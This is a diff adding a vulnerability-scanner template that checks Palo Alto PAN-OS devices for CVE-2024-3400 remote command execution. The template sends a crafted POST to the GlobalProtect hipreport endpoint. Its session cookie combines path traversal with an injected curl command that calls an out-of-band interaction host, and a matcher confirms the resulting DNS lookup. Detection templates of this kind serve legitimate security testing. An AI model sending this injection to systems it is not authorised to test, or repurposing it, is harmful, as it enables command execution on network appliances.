@@ -1,0 +1,30 @@
+id: PaloAltoNetworksPANOS_hipreport_rce
+
+info:
+  name: PaloAltoNetworksPANOS_hipreport_rce
+  author: xiaokp7
+  severity: critical
+  description: PaloAltoNetworksPAN-OS安全设备CVE-2024-3400 远程命令执行漏洞
+
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    POST /ssl-vpn/hipreport.esp HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/`curl${IFS}{{interactsh-url}}`;
+    Content-Type: application/x-www-form-urlencoded
+
+
+  matchers:
+    - type: word
+      part: interactsh_protocol # Confirms the DNS Interaction
+      words:
+        - "dns"
+
+# Generated From WebFuzzer on 2024-04-18 09:43:10
